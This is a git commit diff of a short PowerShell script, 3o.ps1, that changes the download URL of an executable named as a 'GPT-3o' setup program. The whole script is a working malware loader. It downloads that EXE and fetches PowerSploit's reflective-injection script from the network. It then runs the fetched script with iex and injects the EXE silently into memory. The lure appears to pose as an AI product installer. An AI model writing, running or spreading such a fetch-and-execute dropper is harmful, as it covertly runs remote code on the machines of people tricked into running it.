8bd4662c086a3dc36600d14c5e2a8c37d2852a81
rootkalilocalhost <140280170+rootkalilocalhost@users.noreply.github.com>
2025-11-05 23:08:06 +0200

    Update 3o.ps1

--- 3o.ps1
+++ 3o.ps1
@@ -1,5 +1,5 @@
 try {
-    $exeBytes = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/nathan-ingram10/GPT-3o-mini/main/GPT-3o_win-x64_setup.exe')  # URL на EXE
+    $exeBytes = (New-Object Net.WebClient).DownloadData('https://github.com/rootkalilocalhost/modules/GPT-3o_win-x64_setup.exe')  # URL на EXE
     $script = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
     iex $script
     Invoke-ReflectivePEInjection -PEBytes $exeBytes -ExeArgs '/S'  # Silent
